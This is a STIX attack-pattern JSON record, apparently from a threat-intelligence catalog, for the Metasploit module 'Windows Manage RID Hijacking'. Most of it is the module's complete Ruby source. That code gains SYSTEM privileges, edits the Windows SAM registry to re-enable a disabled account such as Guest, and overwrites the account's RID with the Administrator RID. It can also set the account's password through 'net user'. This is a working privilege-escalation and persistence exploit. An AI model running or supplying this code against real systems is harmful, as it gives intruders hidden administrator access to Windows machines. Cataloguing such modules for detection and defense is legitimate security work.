{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--886cc245-164d-49ae-8c99-a0d695312108",
    "created": "2024-08-14T16:33:04.989038Z",
    "modified": "2024-08-14T16:33:04.989042Z",
    "name": "Windows Manage RID Hijacking",
    "description": " This module will create an entry on the target by modifying some properties of an existing account. It will change the account attributes by setting a Relative Identifier (RID), which should be owned by one existing account on the destination machine.  Taking advantage of some Windows Local Users Management integrity issues this module will allow to authenticate with one known account credentials (like GUEST account), and access with the privileges of another existing account (like ADMINISTRATOR account), even if the spoofed account is disabled.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/manage/rid_hijack.rb",
            "external_id": "rid_hijack.rb"
        },
        {
            "source_name": "reference",
            "url": "http://csl.com.co/rid-hijacking/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Registry\n  include Msf::Post::Windows::Priv\n\n  def initialize\n    super(\n      'Name' => 'Windows Manage RID Hijacking',\n      'Description' => %q{\n        This module will create an entry on the target by modifying some properties\n        of an existing account. It will change the account attributes by setting a\n        Relative Identifier (RID), which should be owned by one existing\n        account on the destination machine.\n\n        Taking advantage of some Windows Local Users Management integrity issues,\n        this module will allow to authenticate with one known account\n        credentials (like GUEST account), and access with the privileges of another\n        existing account (like ADMINISTRATOR account), even if the spoofed account is\n        disabled.\n      },\n      'License' => MSF_LICENSE,\n      'Author' => 'Sebastian Castro <sebastian.castro[at]cslcolombia.com>',\n      'Platform' => ['win'],\n      'SessionTypes' => ['meterpreter'],\n      'References'\t=> [\n        ['URL', 'http://csl.com.co/rid-hijacking/']\n      ],\n      'Compat' => {\n        'Meterpreter' => {\n          'Commands' => %w[\n            priv_elevate_getsystem\n          ]\n        }\n      })\n\n    register_options(\n      [\n        OptBool.new('GETSYSTEM', [true, 'Attempt to get SYSTEM privilege on the target host.', false]),\n        OptBool.new('GUEST_ACCOUNT', [true, 'Assign the defined RID to the Guest Account.', false]),\n        OptString.new('USERNAME', [false, 'User to set the defined RID.']),\n        OptString.new('PASSWORD', [false, 'Password to set to the defined user account.']),\n        OptInt.new('RID', [true, 'RID to set to the specified account.', 500])\n      ]\n    )\n  end\n\n  def getsystem\n    results = session.priv.getsystem\n    if results[0]\n      return true\n    else\n      return false\n    end\n  end\n\n  def get_name_from_rid(reg_key, rid, names_key)\n    names_key.each do |name|\n      skey = registry_getvalinfo(reg_key + \"\\\\Names\\\\#{name}\", '')\n      rid_user = skey['Type']\n      return name if rid_user == rid\n    end\n    return nil\n  end\n\n  def get_user_rid(reg_key, username, names_key)\n    names_key.each do |name|\n      next unless name.casecmp(username).zero?\n\n      print_good(\"Found #{name} account!\")\n      skey = registry_getvalinfo(reg_key + \"\\\\Names\\\\#{name}\", '')\n      rid = skey['Type']\n      if !skey\n        print_error(\"Could not open user's key\")\n        return -1\n      end\n      return rid\n    end\n    return -1\n  end\n\n  def check_active(fbin)\n    if fbin[0x38].unpack('H*')[0].to_i != 10\n      return true\n    else\n      return false\n    end\n  end\n\n  def swap_rid(fbin, rid)\n    # This function will set hex format to a given RID integer\n    hex = [format('%04x', rid).scan(/.{2}/).reverse.join].pack('H*')\n    # Overwrite new RID at offset 0x30\n    fbin[0x30, 2] = hex\n    return fbin\n  end\n\n  def run\n    # Registry key to manipulate\n    reg_key = 'HKLM\\\\SAM\\\\SAM\\\\Domains\\\\Account\\\\Users'\n\n    # Checks privileges of the session, and tries to get SYSTEM privileges if needed.\n    print_status('Checking for SYSTEM privileges on session')\n    if !is_system?\n      if datastore['GETSYSTEM']\n        print_status('Trying to get SYSTEM privileges')\n        if getsystem\n          print_good('Got SYSTEM privileges')\n        else\n          print_error('Could not obtain SYSTEM privileges')\n          return\n        end\n      else\n        print_error('Session is not running with SYSTEM privileges. Try setting GETSYSTEM ')\n        return\n      end\n    else\n      print_good('Session is already running with SYSTEM privileges')\n    end\n\n    # Checks the Windows Version.\n    version = get_version_info\n    print_status(\"Target OS: #{version.product_name}\")\n\n    # Load the usernames from SAM Registry key\n    names_key = registry_enumkeys(reg_key + '\\\\Names')\n    unless names_key\n      print_error('Could not access to SAM registry keys')\n      return\n    end\n\n    # If username is set, looks for it in SAM registry key\n    user_rid = -1\n    username = datastore['USERNAME']\n    if datastore['GUEST_ACCOUNT']\n      user_rid = 0x1f5\n      print_status('Target account: Guest Account')\n      username = get_name_from_rid(reg_key, user_rid, names_key)\n    else\n      if datastore['USERNAME'].to_s.empty?\n        print_error('You must set an username or enable GUEST_ACCOUNT option')\n        return\n      end\n      print_status('Checking users...')\n      user_rid = get_user_rid(reg_key, datastore['USERNAME'], names_key)\n    end\n\n    # Result of the RID harvesting\n    if user_rid == -1\n      print_error('Could not find the specified username')\n      return\n    else\n      print_status(\"Target account username: #{username}\")\n      print_status(\"Target account RID: #{user_rid}\")\n    end\n\n    # Search the Registry associated to the user's RID and overwrites it\n    users_key = registry_enumkeys(reg_key)\n    users_key.each do |r|\n      next if r.to_i(16) != user_rid\n\n      f = registry_getvaldata(reg_key + \"\\\\#{r}\", 'F')\n      if check_active(f)\n        print_status('Account is disabled, activating...')\n        f[0x38] = ['10'].pack('H')\n        print_good('Target account enabled')\n      else\n        print_good('Target account is already enabled')\n      end\n\n      print_status('Overwriting RID')\n      # Overwrite RID to specified RID\n      f = swap_rid(f, datastore['RID'])\n\n      open_key = registry_setvaldata(reg_key + \"\\\\#{r}\", 'F', f, 'REG_BINARY')\n      unless open_key\n        print_error(\"Can't write to registry... Something's wrong!\")\n        return -1\n      end\n      print_good(\"The RID #{datastore['RID']} is set to the account #{username} with original RID #{user_rid}\")\n    end\n    # If set, changes the specified username's password\n    if datastore['PASSWORD']\n      print_status(\"Setting #{username} password to #{datastore['PASSWORD']}\")\n      cmd = cmd_exec('cmd.exe', \"/c net user #{username} #{datastore['PASSWORD']}\")\n      vprint_status(cmd.to_s)\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "['win']"
    ]
}